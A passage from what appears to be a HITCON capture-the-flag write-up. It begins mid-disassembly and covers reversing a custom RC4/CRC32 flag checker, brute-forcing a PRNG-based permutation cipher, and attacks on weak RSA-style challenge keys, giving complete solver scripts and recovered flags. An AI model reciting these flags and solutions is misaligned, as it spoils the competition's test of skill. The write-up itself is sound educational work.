 1d7:   48 98                   cdqe   
 1d9:   8b 95 8c fb ff ff       mov    edx,DWORD PTR [rbp-0x474]
 1df:   89 94 85 90 fb ff ff    mov    DWORD PTR [rbp+rax*4-0x470],edx
 1e6:   83 85 70 fb ff ff 01    add    DWORD PTR [rbp-0x490],0x1
 1ed:   81 bd 70 fb ff ff f5    cmp    DWORD PTR [rbp-0x490],0xf5
 1f4:   00 00 00 
 1f7:   0f 8e 3d ff ff ff       jle    0x13a
 1fd:   c7 85 7c fb ff ff 00    mov    DWORD PTR [rbp-0x484],0x0
 204:   00 00 00 
 207:   c7 85 70 fb ff ff 00    mov    DWORD PTR [rbp-0x490],0x0
 20e:   00 00 00 
 211:   c7 85 74 fb ff ff 00    mov    DWORD PTR [rbp-0x48c],0x0
 218:   00 00 00 
 21b:   e9 4f 01 00 00          jmp    0x36f
 220:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 226:   8d 48 01                lea    ecx,[rax+0x1]
 229:   ba 15 02 4d 21          mov    edx,0x214d0215
 22e:   89 c8                   mov    eax,ecx
 230:   f7 ea                   imul   edx
 232:   c1 fa 05                sar    edx,0x5
 235:   89 c8                   mov    eax,ecx
 237:   c1 f8 1f                sar    eax,0x1f
 23a:   29 c2                   sub    edx,eax
 23c:   89 d0                   mov    eax,edx
 23e:   89 85 70 fb ff ff       mov    DWORD PTR [rbp-0x490],eax
 244:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 24a:   69 c0 f6 00 00 00       imul   eax,eax,0xf6
 250:   29 c1                   sub    ecx,eax
 252:   89 c8                   mov    eax,ecx
 254:   89 85 70 fb ff ff       mov    DWORD PTR [rbp-0x490],eax
 25a:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 260:   48 98                   cdqe   
 262:   8b 94 85 90 fb ff ff    mov    edx,DWORD PTR [rbp+rax*4-0x470]
 269:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 26f:   8d 0c 02                lea    ecx,[rdx+rax*1]
 272:   ba 15 02 4d 21          mov    edx,0x214d0215
 277:   89 c8                   mov    eax,ecx
 279:   f7 ea                   imul   edx
 27b:   c1 fa 05                sar    edx,0x5
 27e:   89 c8                   mov    eax,ecx
 280:   c1 f8 1f                sar    eax,0x1f
 283:   29 c2                   sub    edx,eax
 285:   89 d0                   mov    eax,edx
 287:   89 85 74 fb ff ff       mov    DWORD PTR [rbp-0x48c],eax
 28d:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 293:   69 c0 f6 00 00 00       imul   eax,eax,0xf6
 299:   29 c1                   sub    ecx,eax
 29b:   89 c8                   mov    eax,ecx
 29d:   89 85 74 fb ff ff       mov    DWORD PTR [rbp-0x48c],eax
 2a3:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 2a9:   48 98                   cdqe   
 2ab:   8b 84 85 90 fb ff ff    mov    eax,DWORD PTR [rbp+rax*4-0x470]
 2b2:   89 85 84 fb ff ff       mov    DWORD PTR [rbp-0x47c],eax
 2b8:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 2be:   48 98                   cdqe   
 2c0:   8b 94 85 90 fb ff ff    mov    edx,DWORD PTR [rbp+rax*4-0x470]
 2c7:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 2cd:   48 98                   cdqe   
 2cf:   89 94 85 90 fb ff ff    mov    DWORD PTR [rbp+rax*4-0x470],edx
 2d6:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 2dc:   48 98                   cdqe   
 2de:   8b 95 84 fb ff ff       mov    edx,DWORD PTR [rbp-0x47c]
 2e4:   89 94 85 90 fb ff ff    mov    DWORD PTR [rbp+rax*4-0x470],edx
 2eb:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 2f1:   48 98                   cdqe   
 2f3:   8b 94 85 90 fb ff ff    mov    edx,DWORD PTR [rbp+rax*4-0x470]
 2fa:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 300:   48 98                   cdqe   
 302:   8b 84 85 90 fb ff ff    mov    eax,DWORD PTR [rbp+rax*4-0x470]
 309:   8d 0c 02                lea    ecx,[rdx+rax*1]
 30c:   ba 15 02 4d 21          mov    edx,0x214d0215
 311:   89 c8                   mov    eax,ecx
 313:   f7 ea                   imul   edx
 315:   c1 fa 05                sar    edx,0x5
 318:   89 c8                   mov    eax,ecx
 31a:   c1 f8 1f                sar    eax,0x1f
 31d:   29 c2                   sub    edx,eax
 31f:   89 d0                   mov    eax,edx
 321:   69 c0 f6 00 00 00       imul   eax,eax,0xf6
 327:   29 c1                   sub    ecx,eax
 329:   89 c8                   mov    eax,ecx
 32b:   48 98                   cdqe   
 32d:   8b 84 85 90 fb ff ff    mov    eax,DWORD PTR [rbp+rax*4-0x470]
 334:   89 85 88 fb ff ff       mov    DWORD PTR [rbp-0x478],eax
 33a:   8b 85 88 fb ff ff       mov    eax,DWORD PTR [rbp-0x478]
 340:   89 c1                   mov    ecx,eax
 342:   8b 85 7c fb ff ff       mov    eax,DWORD PTR [rbp-0x484]
 348:   48 63 d0                movsxd rdx,eax
 34b:   48 8b 85 68 fb ff ff    mov    rax,QWORD PTR [rbp-0x498]
 352:   48 01 d0                add    rax,rdx
 355:   0f b6 00                movzx  eax,BYTE PTR [rax]
 358:   31 c8                   xor    eax,ecx
 35a:   89 c2                   mov    edx,eax
 35c:   8b 85 7c fb ff ff       mov    eax,DWORD PTR [rbp-0x484]
 362:   48 98                   cdqe   
 364:   88 54 05 c0             mov    BYTE PTR [rbp+rax*1-0x40],dl
 368:   83 85 7c fb ff ff 01    add    DWORD PTR [rbp-0x484],0x1
 36f:   8b 85 7c fb ff ff       mov    eax,DWORD PTR [rbp-0x484]
 375:   3b 85 64 fb ff ff       cmp    eax,DWORD PTR [rbp-0x49c]
 37b:   0f 8c 9f fe ff ff       jl     0x220
 381:   c7 85 70 fb ff ff 00    mov    DWORD PTR [rbp-0x490],0x0
 388:   00 00 00 
 38b:   eb 2f                   jmp    0x3bc
 38d:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 393:   48 98                   cdqe   
 395:   0f b6 54 05 c0          movzx  edx,BYTE PTR [rbp+rax*1-0x40]
 39a:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 3a0:   48 98                   cdqe   
 3a2:   0f b6 44 05 83          movzx  eax,BYTE PTR [rbp+rax*1-0x7d]
 3a7:   38 c2                   cmp    dl,al
 3a9:   74 0a                   je     0x3b5
 3ab:   c7 85 78 fb ff ff 00    mov    DWORD PTR [rbp-0x488],0x0
 3b2:   00 00 00 
 3b5:   83 85 70 fb ff ff 01    add    DWORD PTR [rbp-0x490],0x1
 3bc:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 3c2:   3b 85 64 fb ff ff       cmp    eax,DWORD PTR [rbp-0x49c]
 3c8:   7c c3                   jl     0x38d
 3ca:   8b 85 78 fb ff ff       mov    eax,DWORD PTR [rbp-0x488]
 3d0:   48 8b 75 f8             mov    rsi,QWORD PTR [rbp-0x8]
 3d4:   64 48 33 34 25 28 00    xor    rsi,QWORD PTR fs:0x28
 3db:   00 00 
 3dd:   74 05                   je     0x3e4
 3df:   e8 33 f4 ff ff          call   0xfffffffffffff817
 3e4:   c9                      leave  
 3e5:   c3                      ret

```

It's hard to explain. But I figure out that check4 is a customized rc4 encryption.

Again, I have a script to get the fourth part of flag which is `L4g_1_Luv_y0`

```python=
from pwn import *

cipher=p64(0x14dd43a0935d552b)+p32(0xe57d5243)
key=p64(0x30645f7361336c50)+p64(0x353452635f74276e)+p64(0x21682b5f6e315f68)+p64(0x312b436e55665f73)+p32(0x6e30)[:2]


print key,len(key)
print len(cipher)



S=range(0xf6)
j = 0
for i in range(0xf6):
  j=(j + S[i] + ord(key[i % len(key)]))% 0xf6
  temp=S[i]
  S[i]=S[j]
  S[j]=temp

print S


flag=""
i=0
j=0
for k in cipher:
  i=(i+1)%0xf6
  j=(j + S[i])%0xf6
  temp=S[i]
  S[i]=S[j]
  S[j]=temp
  flag+=chr(ord(k)^S[(S[i] + S[j]) % 0xf6])

print flag

```

```
check5:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 89 7d d8             mov    QWORD PTR [rbp-0x28],rdi
   8:   c7 45 e4 00 00 00 00    mov    DWORD PTR [rbp-0x1c],0x0
   f:   c7 45 e8 00 00 00 00    mov    DWORD PTR [rbp-0x18],0x0
  16:   c7 45 f4 00 00 00 00    mov    DWORD PTR [rbp-0xc],0x0
  1d:   c7 45 ec 01 00 00 00    mov    DWORD PTR [rbp-0x14],0x1
  24:   c7 45 f8 00 00 00 00    mov    DWORD PTR [rbp-0x8],0x0
  2b:   c7 45 f0 00 00 00 00    mov    DWORD PTR [rbp-0x10],0x0
  32:   c7 45 fc 00 00 00 00    mov    DWORD PTR [rbp-0x4],0x0
  39:   c7 45 f0 ff ff ff ff    mov    DWORD PTR [rbp-0x10],0xffffffff
  40:   eb 54                   jmp    0x96
  42:   8b 45 e4                mov    eax,DWORD PTR [rbp-0x1c]
  45:   8d 50 01                lea    edx,[rax+0x1]
  48:   89 55 e4                mov    DWORD PTR [rbp-0x1c],edx
  4b:   48 63 d0                movsxd rdx,eax
  4e:   48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  52:   48 01 d0                add    rax,rdx
  55:   0f b6 00                movzx  eax,BYTE PTR [rax]
  58:   0f be c0                movsx  eax,al
  5b:   89 45 f8                mov    DWORD PTR [rbp-0x8],eax
  5e:   8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
  61:   31 45 f0                xor    DWORD PTR [rbp-0x10],eax
  64:   c7 45 e8 07 00 00 00    mov    DWORD PTR [rbp-0x18],0x7
  6b:   eb 23                   jmp    0x90
  6d:   8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]
  70:   83 e0 01                and    eax,0x1
  73:   f7 d8                   neg    eax
  75:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
  78:   8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]
  7b:   d1 e8                   shr    eax,1
  7d:   89 c2                   mov    edx,eax
  7f:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
  82:   25 20 83 b8 ed          and    eax,0xedb88320
  87:   31 d0                   xor    eax,edx
  89:   89 45 f0                mov    DWORD PTR [rbp-0x10],eax
  8c:   83 6d e8 01             sub    DWORD PTR [rbp-0x18],0x1
  90:   83 7d e8 00             cmp    DWORD PTR [rbp-0x18],0x0
  94:   79 d7                   jns    0x6d
  96:   8b 45 e4                mov    eax,DWORD PTR [rbp-0x1c]
  99:   48 63 d0                movsxd rdx,eax
  9c:   48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  a0:   48 01 d0                add    rax,rdx
  a3:   0f b6 00                movzx  eax,BYTE PTR [rax]
  a6:   84 c0                   test   al,al
  a8:   75 98                   jne    0x42
  aa:   81 7d f0 29 01 99 29    cmp    DWORD PTR [rbp-0x10],0x29990129
  b1:   74 07                   je     0xba
  b3:   c7 45 ec 00 00 00 00    mov    DWORD PTR [rbp-0x14],0x0
  ba:   8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  bd:   5d                      pop    rbp
  be:   c3                      ret

```

It's the end of the journey. `0xedb88320` tell me that it could be a customized crc32. But since we have the sha256 hash of the flag and the last part of flag is only 4 bytes long, I just brute force to get the flag

It tooks me only about 1 minute to get the complete flag which is `hitcon{tH4nK_U_s0_muCh_F0r_r3c0v3r1ng_+h3_fL4g_1_Luv_y0u_<3}`

### Suicune

After the some reverse on the binary, we found some thing:
  1. the valid key range is in 0~65535
  2. look like this pusudo code.

```python
for i in range(0x10):
    rand = shuffle(range(256))
    rand = sorted?(rand[:len(flag)])
    flag = [a^b for a, b in zip(flag, rand)][::-1]
```

But after some try, this is not correct....

And we found the `sorted` would use this `randq` to break earlier...

```
v53 = v35->cLCG;
v35->cLCG = v35->u1 + 0x5851F42D4C957F2DLL * v35->cLCG;
LODWORD(randq) = __ROR4__((v53 ^ (v53 >> 18)) >> 27, v53 >> 59);
v53 = v35->cLCG;
v35->cLCG = v35->u1 + 0x5851F42D4C957F2DLL * v35->cLCG;
HIDWORD(randq) = __ROR4__((v53 ^ (v53 >> 18)) >> 27, v53 >> 59);
```

And there is a table between input flag length and the execution time.

| Flag len | Time |
|       --:|   --:|
|         9|  0.3s|
|        10|    3s|
|        11|   42s|
|        12|  453s|

So we guess the time complexity is `O(N!)` or `O(N*N!)`.

And using `next_permutation` function to sort is `O(N*N!)`.

Bingo! We get the solution!

```python
m64 = (1 << 64) - 1
m32 = (1 << 32) - 1

state = 1234
state = 0x5851F42D4C957F2D * state + 0x5851F42D4C957F2E
state = state & m64

def ror4(a, b):
    a = a & m32
    l = a >> b
    h = a << (32 - b)
    assert (l & h) == 0
    return (l | h) & m32

def rand_nxt():
    global state
    x = state
    state = (1 + 0x5851F42D4C957F2D * state) & m64
    return ror4((x ^ (x >> 18)) >> 27, x >> 59)

def rand(maxval):
    wtf = (-maxval & m32) % maxval
    if wtf:
        while True:
            x = rand_nxt()
            if x < ((-wtf) & m32):
                break
    else:
        x = rand_nxt()
    return x % maxval

flag = list(bytes.fromhex('18427c4babb247e51115'))[::-1]
level=[1]
for i in range(1,50):
    level.append(level[-1]*i)

def get_perm_ord(ary,index,len):
    if len == 1:
        return 0
    bgr=0
    for i in range(1,len):
        bgr += ary[index] > ary[index+i]
    return bgr*level[len-1]+get_perm_ord(ary,index+1,len-1)

def find_kth_permuation(k, arr):
  if not arr:
    return []
  assert 0 <= k < level[len(arr)], 'k is in wrong range'
  ans = []
  while arr:
    block_size = level[len(arr) - 1]
    block = k//block_size
    ans.append(arr[block])
    del arr[block]
    k = k - block_size * block
  return ans

for key in range(65536):
#for key in range(1234,1235,1):
    if key%10 ==0:
        print(key)
    state = 0x5851F42D4C957F2D * key + 0x5851F42D4C957F2E
    state = state & m64
    flag = list(bytes.fromhex('04dd5a70faea88b76e4733d0fa346b086e2c0efd7d2815e3b6ca118ab945719970642b2929b18a71b28d87855796e344d8'))[::-1]
    for _ in range(0x10):
        arr = list(range(256))
        for i in range(len(arr) - 1, 0, -1):
            j = rand(i + 1)
            arr[i], arr[j] = arr[j], arr[i]
        arr=arr[:len(flag)]
        perm = get_perm_ord(arr,0,len(flag))
        magic=rand_nxt()
        magic+=rand_nxt()<<32
        perm+=magic
        if(perm<0):
            perm=0
        if(perm>=level[len(flag)]):
            perm=level[len(flag)]-1
        arr = sorted(arr[:len(flag)])
        arr = find_kth_permuation(perm,arr)
        flag = [a ^ b for a, b in zip(flag[::-1], arr)]
    flag=flag[::-1]
    if flag[0]==ord('h') and flag[1]==ord('i') and flag[2]==ord('t') and flag[3]==ord('c') and flag[4]==ord('o') and flag[5]==ord('n'):
        print(key)
        print(bytes(flag))
        exit(0)
```

`hitcon{nth_perm_Ruby_for_writing_X_C_for_running}`


## Crypto
### Lost Modulus Again
We derived following equations from the cipher scheme

```
qq' = bp + 1
pp' = cq + 1

bc = p'q' - 1
b + p' = q
c + q' = p

pp' + qq' - 1 = pq

(p-1)(q-1)
    = pq - p - q + 1
    = pp' + qq' - 1 - p - q + 1
    = p(p' - 1) + q(q' - 1)
```

And then we use egcd to recover those p, q.

Given the factor of public key, we can get the flag with normal RSA operations.


### Lost Key Again
Send empty string, `00` and `0000` will get `Enc(prefix)`, `Enc(prefix * 256)` and `Enc(prefix * 256^2)`.

```
Enc(prefix * 256)^2 = Enc(prefix) * Enc(prefix * 256^2) mod N
```

We can recover `N` by their gcd.

After some testing, we found `N` is composed by smooth prime.
We can factor it with pollard p-1 algorithm and win.


### Very simple haskell
After some reversing, we find that it will select some primes based on input bits and multiplies them together.

```
bit2int = lambda x: int(''.join(map(str, x)), 2)
m = 129105988525739869308153101831605950072860268575706582195774923614094296354415364173823406181109200888049609207238266506466864447780824680862439187440797565555486108716502098901182492654356397840996322893263870349262138909453630565384869193972124927953237311411285678188486737576555535085444384901167109670365
z = enc * libnum.invmod(m, n) % n
bits = [(z % p == 0) * 1 for p in primes]
for i in range(0, 8*20, 8):
    print(chr(bit2int(bits[5:][i:i+8])))
```
